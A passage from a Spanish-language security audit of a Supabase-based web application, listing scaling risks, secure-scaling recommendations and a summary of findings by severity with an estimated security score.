| **Audit log no bloqueante** | A escala, las fallas del audit log son mas frecuentes, dejando operaciones financieras sin registro | Compliance issues, disputas irresolubles |
| **Service role key en rutas publicas** | Con mas trafico, las rutas que usan `SUPABASE_SERVICE_KEY` sin auth son un target mayor | Bypass de RLS a escala = acceso a toda la BD |

### Recomendaciones de escalabilidad segura

1. **Session store distribuido**: Migrar de cookies JSON a Redis-backed sessions antes de escalar. Las cookies firmadas con HMAC son suficientes para <100 admin, pero un session store permite revocar sesiones comprometidas.

2. **Rate limiting distribuido**: Reemplazar el rate limiter in-memory con Redis-backed (e.g., `@upstash/ratelimit`) para consistencia entre instancias.

3. **Separacion de responsabilidades**: Mover las rutas admin del frontend (`/api/admin/*`) al servicio admin dedicado. Actualmente hay duplicacion (admin orders en frontend Y en admin).

4. **Cifrado end-to-end de PII**: Con 1.000+ clientes en la UE, el cifrado de PII en reposo pasa de "nice to have" a requisito legal. Implementar `pgsodium` para columnas sensibles.

5. **WAF (Web Application Firewall)**: Con 1.000+ clientes, el trafico malicioso aumenta. Cloudflare WAF o similar es necesario para proteger contra ataques automatizados (SQLi, XSS, credential stuffing).

6. **Monitoring de seguridad**: Implementar deteccion de anomalias (multiples logins fallidos, acceso desde IPs inusuales, exportaciones masivas de datos) antes de escalar.

7. **Backup y disaster recovery**: Con datos de 1.000+ clientes, los backups automatizados y encriptados son criticos. Supabase Cloud los provee, pero verificar retention y recovery time.

---

## Resumen de findings por severidad

| Severidad | Cantidad | IDs |
|-----------|----------|-----|
| **CRITICAL** | 3 | C-01, C-02, C-03 |
| **HIGH** | 4 | H-01, H-02, H-03, H-04 |
| **MEDIUM** | 8 | M-01, M-02, M-03, M-04, M-05, M-06, M-07, M-08 |
| **LOW** | 2 | L-01, L-02 |
| **POSITIVO** | 8 | Frontend auth, Stripe webhook, Cron protection, SQL injection protection, Docker hardening, Security headers, .gitignore, GDPR |

**Score de seguridad estimado: 45/100** (antes de remediacion)

La puntuacion baja se debe principalmente a la combinacion catastrofica de C-01 + C-02, que efectivamente deja el panel admin completamente abierto. Con la Fase 0 completada, el score subiria a ~75/100. Con Fases 0-2, a ~90/100.
